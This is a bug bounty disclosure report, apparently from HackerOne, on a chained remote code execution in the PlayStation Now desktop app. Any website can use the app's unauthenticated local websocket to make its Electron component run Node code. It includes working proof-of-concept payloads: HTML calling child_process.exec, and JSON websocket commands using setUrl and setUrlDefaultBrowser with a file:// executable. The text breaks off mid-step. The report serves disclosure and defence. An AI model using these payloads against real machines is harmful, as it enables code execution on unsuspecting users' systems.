https://bugs.chromium.org/p/project-zero/issues/detail?id=1663. And he is much smarter than I will ever be.\n* Bonus win: Do not listen on all interfaces, bind the server to `localhost`.\n\n## Impact\nAttackers can run code on users' machines. They can get to the other side of the airtight hatchway.","can_view?":true,"can_edit?":false,"content_html":"\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003cp\u003eThe PlayStation Now application version \u003ccode\u003e11.0.2\u003c/code\u003e is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe local websocket server at \u003ccode\u003elocalhost:1235\u003c/code\u003e does not check the origin of incoming requests.\n\n\u003col\u003e\n\u003cli\u003eThis allows websites loaded in browsers on the same machine to send requests to the websocket server.\u003c/li\u003e\n\u003cli\u003eWebsockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003epsnow launches an Electron application named \u003ccode\u003eAGL\u003c/code\u003e.\n\n\u003col\u003e\n\u003cli\u003eIt\u0026#39;s possible to tell AGL to load a specific website with a command sent to the websocket server.\u003c/li\u003e\n\u003cli\u003eAs a result, the websites above can tell AGL to load any remote URL.\u003c/li\u003e\n\u003cli\u003eIt\u0026#39;s also possible to tell \u003ccode\u003eAGL\u003c/code\u003e to run any local application via the \u003ccode\u003esetUrlDefaultBrowser\u003c/code\u003e command.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eThe AGL Electron application has \u003ccode\u003enodeIntegration: true\u003c/code\u003e so JavaScript running in any loaded URL can spawn new processes.\n\n\u003col\u003e\n\u003cli\u003eSo any URL loaded in the AGL application can run code on the target machine.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eChaining these three issues gives us RCE.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThe PlayStation Now application (\u003ccode\u003epsnow\u003c/code\u003e moving forward) is an online streaming application for playing PlayStation games. Version \u003ccode\u003e11.0.2\u003c/code\u003e is the current version at the time of writing. The latest version can be downloaded from \u003ca title=\"https://download-psnow.playstation.com/downloads/psnow/pc/latest\" href=\"/redirect?url=https%3A%2F%2Fdownload-psnow.playstation.com%2Fdownloads%2Fpsnow%2Fpc%2Flatest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://download-psnow.playstation.com/downloads/psnow/pc/latest\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eIt has two major components: \u003ccode\u003eQAS\u003c/code\u003e and \u003ccode\u003eAGL\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"qas\"\u003eQAS\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003eQAS\u003c/code\u003e is an executable named \u003ccode\u003epsnowlauncher.exe\u003c/code\u003e and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is \u003ccode\u003eC:\\Program Files (x86)\\PlayStationNow\\psnowlauncher.exe\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eNote: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.\u003c/p\u003e\n\n\u003cp\u003eAfter launch, it runs a different application called \u003ccode\u003eAGL\u003c/code\u003e. The following picture is the complete list of processes in Process Monitor.\u003c/p\u003e\n\n\u003cp\u003eProcesses in procmon:\u003c/p\u003e\n\n\u003cp\u003e{F827146}\u003c/p\u003e\n\n\u003cp\u003eThe QAS application also runs a websocket server at \u003ccode\u003elocalhost:1235\u003c/code\u003e. \u003ccode\u003enetstat -anb\u003c/code\u003e in an elevated command line tells us about it:\u003c/p\u003e\n\n\u003cp\u003ewebsocket server:\u003c/p\u003e\n\n\u003cp\u003e{F827147}\u003c/p\u003e\n\n\u003ch2 id=\"agl\"\u003eAGL\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003eAGL\u003c/code\u003e is an Electron application. In a typical execution, it\u0026#39;s spawned by QAS. In the current version, it\u0026#39;s run with this \u003ccode\u003eurl\u003c/code\u003e command line parameter:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026quot;C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\u0026quot; --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis is the URL of the page that will be initially loaded by the AGL application.\u003c/p\u003e\n\n\u003cp\u003eAGL execution\u003c/p\u003e\n\n\u003cp\u003e{F827149}\u003c/p\u003e\n\n\u003ch3 id=\"issue-1-nodeintegration-set-to-true\"\u003eIssue 1: nodeIntegration Set to true\u003c/h3\u003e\n\n\u003cp\u003e\u003ccode\u003enodeIntegration\u003c/code\u003e is the ability for the JavaScript running in an Electron \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.electronjs.org%2Fdocs%2Fapi%2Fbrowser-window\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBrowserWindow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to access the Node.js APIs. The default value is \u003ccode\u003efalse\u003c/code\u003e but it is set to \u003ccode\u003etrue\u003c/code\u003e in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.\u003c/p\u003e\n\n\u003cp\u003eWe can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eThis should pop calc on Windows\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003echild_process\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecalc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e\u0026quot;C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\u0026quot; --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ePopping calc:\u003c/p\u003e\n\n\u003cp\u003e{F827156}\u003c/p\u003e\n\n\u003cp\u003eWe can see the new processes in Process Monitor:\u003c/p\u003e\n\n\u003cp\u003e{F827151}\u003c/p\u003e\n\n\u003cp\u003eThis is not that useful. We can run code on our own machine, WOW! As Raymond Chen said \u003ca href=\"/redirect?url=https%3A%2F%2Fdevblogs.microsoft.com%2Foldnewthing%2F20060508-22%2F%3Fp%3D31283\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eIt rather involved being on the other side of this airtight hatchway\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"proxying-the-applications\"\u003eProxying The Applications\u003c/h2\u003e\n\n\u003cp\u003eWe can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRun \u003ccode\u003econtrol.exe inetcpl.cpl,,4\u003c/code\u003e. This opens the Windows proxy settings without having to open Internet Explorer.\u003c/li\u003e\n\u003cli\u003eClick on \u003ccode\u003eLAN Settings\u003c/code\u003e and set the proxy.\n\n\u003col\u003e\n\u003cli\u003eMake sure nothing under \u003ccode\u003eAutomatic Configuration\u003c/code\u003e is checked.\u003c/li\u003e\n\u003cli\u003eMake sure the \u003ccode\u003eBypass proxy server for local addresses\u003c/code\u003e is \u003cstrong\u003eNOT checked\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eSet the proxy to the listener, Burp\u0026#39;s default is \u003ccode\u003e127.0.0.1:8080\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAdd Burp\u0026#39;s Certificate Authority (CA) to the Windows certificate store.\n\n\u003col\u003e\n\u003cli\u003e\u003ca title=\"https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fsupport%2Finstalling-burp-suites-ca-certificate-in-internet-explorer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eThe instructions mention Internet Explorer but it\u0026#39;s actually for Windows.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"identifying-traffic-in-burp\"\u003eIdentifying Traffic in Burp\u003c/h3\u003e\n\n\u003cp\u003eIn Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word \u003ccode\u003egkApollo\u003c/code\u003e in its \u003ccode\u003eUser-Agent\u003c/code\u003e header.\u003c/p\u003e\n\n\u003cp\u003eThe user-agent for requests coming from the two applications has more indicators:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eQAS is the Qt5 app and has \u003ccode\u003eQtWebEngine/5.5.1\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAGL is based on Electron and it has \u003ccode\u003eElectron/1.4.16\u003c/code\u003e and \u003ccode\u003eplaystation-now/0.0.0\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI am using a Burp extension named \u003ca href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fbappstore%2F11729a617d8d4d3b87c82e34b71885c3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eRequest Highlighter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to highlight requests based on these words in the user-agent.\u003c/p\u003e\n\n\u003cp\u003eIn my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.\u003c/p\u003e\n\n\u003cp\u003e{F827153}\u003c/p\u003e\n\n\u003ch2 id=\"local-websocket-server\"\u003eLocal Websocket Server\u003c/h2\u003e\n\n\u003cp\u003eQAS starts a local websocket server on port \u003ccode\u003e1235\u003c/code\u003e. Then the website loaded in AGL (in this case \u0026quot;psnow.playstation.com/app/\u0026quot;) connects to it and sends commands to the server.\u003c/p\u003e\n\n\u003ch3 id=\"issue-2-local-websocket-server-does-not-check-the-origin-header\"\u003eIssue 2: Local Websocket Server does not Check the Origin Header\u003c/h3\u003e\n\n\u003cp\u003eThis is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.\u003c/p\u003e\n\n\u003cp\u003eSome examples of other vulnerable setups:\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Ftaviso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTavis Ormandy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e from Google Project Zero found a very similar setup in Logitech Options.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1663\" href=\"/redirect?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1663\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.chromium.org/p/project-zero/issues/detail?id=1663\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAnother by TavisO for TrendMicro. Not websocket but involved a local webserver: \u003ca title=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=693\" href=\"/redirect?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D693\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.chromium.org/p/project-zero/issues/detail?id=693\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eZoom used a local webserver to automatically launch the application from the website. Disclosure by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FJLLeitschuh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJonathan Leitschuh\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5\" href=\"/redirect?url=https%3A%2F%2Fmedium.com%2Fbugbountywriteup%2Fzoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003cstrong\u003eWhy is this bad?\u003c/strong\u003e Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to \u003ccode\u003ehttp://localhost:1235\u003c/code\u003e and sends requests to the websocket server. These requests will be processed.\u003c/p\u003e\n\n\u003ch3 id=\"yet-another-chat-application-as-proof-of-concept\"\u003eYet Another Chat Application as Proof of Concept\u003c/h3\u003e\n\n\u003cp\u003eI stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to \u003ccode\u003ews://localhost:1235\u003c/code\u003e, prints any message received and allows us to send messages at will. You can see the source at:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ehttps://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html\u003c/li\u003e\n\u003cli\u003eOpen the page in a browser in a different machine and see the source. It\u0026#39;s simple enough that I could understand it.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003col\u003e\n\u003cli\u003eStart the psnow app in a VM.\u003c/li\u003e\n\u003cli\u003eOpen the above URL in a browser in the same VM.\u003c/li\u003e\n\u003cli\u003eSee the websocket messages from the psnow app in the browser.\n\n\u003col\u003e\n\u003cli\u003eIf we keep the chat app running, it will keep printing messages received from the client.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eSend any message to the local server via the text field.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e{F827145}\u003c/p\u003e\n\n\u003ch2 id=\"websocket-messages\"\u003eWebsocket Messages\u003c/h2\u003e\n\n\u003cp\u003eNow we need to look into the websocket messages and how we can exploit them.\u003c/p\u003e\n\n\u003cp\u003eAfter opening the initial URL at \u003ccode\u003ehttps://psnow.playstation.com/app/1.10.43/105/00d3603f8/\u003c/code\u003e we can see the \u003ccode\u003eConnection: Upgrade\u003c/code\u003e request to this server from \u003ccode\u003epsnow.playstation.com\u003c/code\u003e. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.\u003c/p\u003e\n\n\u003cp\u003e{F827150}\u003c/p\u003e\n\n\u003cp\u003eNow we can switch to the \u003ccode\u003eProxy \u0026gt; Websockets history\u003c/code\u003e tab in Burp to see the websocket messages.\u003c/p\u003e\n\n\u003cp\u003e{F827152}\u003c/p\u003e\n\n\u003cp\u003eAll the requests are in JSON (probably created by \u003ccode\u003eJSON.stringify\u003c/code\u003e). The interesting ones start with \u003ccode\u003ecommand\u003c/code\u003e. For example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;command\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;isMicConnected\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;params\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;source\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;AGL\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;QAS\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003ecommand\u003c/code\u003e: What to do.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eparams\u003c/code\u003e: Command parameters.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003esource\u003c/code\u003e: The program issuing the command.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003etarget\u003c/code\u003e: The program running the command.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBoth target and source can be the same app. I do not think it really matters what the source is. I think only \u003ccode\u003etarget\u003c/code\u003e is mandatory.\u003c/p\u003e\n\n\u003cp\u003eWe can search for more commands in websocket messages. The most important command is \u003ccode\u003esetUrl\u003c/code\u003e. There are more commands in the source of the Electron app (unpack \u003ccode\u003eapp.asar\u003c/code\u003e and search for \u003ccode\u003ecommandHandler\u003c/code\u003e) but this is the most useful along with \u003ccode\u003esetUrlDefaultBrowser\u003c/code\u003e (opens a URL in the default browser on the machine).\u003c/p\u003e\n\n\u003cp\u003e{F827154}\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;command\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;setUrl\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;params\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https://psnow.playstation.com/app/1.10.43/105/00d3603f8/\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;source\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;AGL\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;QAS\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let\u0026#39;s tell QAS to load \u003ccode\u003ehttps://example.net\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e{F827155}\u003c/p\u003e\n\n\u003cp\u003eBut this is not fun. We want AGL to load websites and not QAS. \u003cstrong\u003eWHAT IF\u003c/strong\u003e we switched target and source?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;command\u0026quot;:\u0026quot;setUrl\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://example.net\u0026quot;},\u0026quot;source\u0026quot;:\u0026quot;QAS\u0026quot;,\u0026quot;target\u0026quot;:\u0026quot;AGL\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis command will tell AGL (the Electron app) to load \u003ccode\u003eexample.net\u003c/code\u003e. The gif has been minimized, please click on it to enlarge it:\u003c/p\u003e\n\n\u003cp\u003e{F827144}\u003c/p\u003e\n\n\u003cp\u003eLater, I found out that we can use another TavisO bug to get RCE another way. \u003ca title=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=693\" href=\"/redirect?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D693\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.chromium.org/p/project-zero/issues/detail?id=693\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can abuse the \u003ccode\u003esetUrlDefaultBrowser\u003c/code\u003e command. It gets passed to \u003ccode\u003eshell.openExternal(url)\u003c/code\u003e and allows the \u003ccode\u003efile\u003c/code\u003e scheme.\u003c/p\u003e\n\n\u003cp\u003eSo the following command should pop calc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;command\u0026quot;:\u0026quot;setUrlDefaultBrowser\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;file:///c:/windows/system32/calc.exe\u0026quot;},\u0026quot;source\u0026quot;:\u0026quot;QAS\u0026quot;,\u0026quot;target\u0026quot;:\u0026quot;AGL\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote: \u003ccode\u003eQAS\u003c/code\u003e does not have this command.\u003c/p\u003e\n\n\u003cp\u003eWebsockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see \u003ca title=\"https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc\" href=\"/redirect?url=https%3A%2F%2Fblog.securityevaluators.com%2Fwebsockets-not-bound-by-cors-does-this-mean-2e7819374acc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"issue-3-you-can-tell-agl-to-load-arbitrary-websites\"\u003eIssue 3: You Can Tell AGL to Load Arbitrary Websites\u003c/h2\u003e\n\n\u003cp\u003eA single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.\u003c/p\u003e\n\n\u003ch2 id=\"putting-everything-together\"\u003ePutting Everything Together\u003c/h2\u003e\n\n\u003cp\u003eSo far we have established three things:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIf a website with Node code is loaded in AGL, we can run arbitrary on the target\u0026#39;s machine.\u003c/li\u003e\n\u003cli\u003eAny website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.\u003c/li\u003e\n\u003cli\u003eA websocket command with \u003ccode\u003esetUrl\u003c/code\u003e or \u003ccode\u003esetUrlDefaultBrowser\u003c/code\u003e can tell AGL to load any URL.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"possible-attack-scenario\"\u003ePossible Attack Scenario\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eUser is running psnow on their machine.\n\n\u003col\u003e\n\u003cli\u003eNote that when the users close the psnow window it gets minimized to tray and is still running. So there\u0026#39;s a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eThe user opens a website in their browser. Any browser will do.\n\n\u003col\u003e\n\u003cli\u003eSomeone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eThe website in the browser connects to the websocket server at \u003ccode\u003ews://localhost:1235\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe website sends a message to the websocket server. The message tells AGL to load another website that contains node code.\n\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e{\u0026quot;command\u0026quot;:\u0026quot;setUrl\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://[redacted].s3.us-east-1.amazonaws.com/node.html\u0026quot;},\u0026quot;source\u0026quot;:\u0026quot;QAS\u0026quot;,\u0026quot;target\u0026quot;:\u0026quot;AGL\u0026quot;}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAlternatively, it can abuse the \u003ccode\u003esetUrlDefaultBrowser\u003c/code\u003e command.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eAGL loads the new website. Arbitrary code runs on the user\u0026#39;s machine.\u003c/li\u003e\n\u003cli\u003e???\u003c/li\u003e\n\u003cli\u003eRCE.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eIf you have read up until here, you deserve a calc popping gif.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRun psnow in a VM.\u003c/li\u003e\n\u003cli\u003eGo to the following URL in a browser on the same 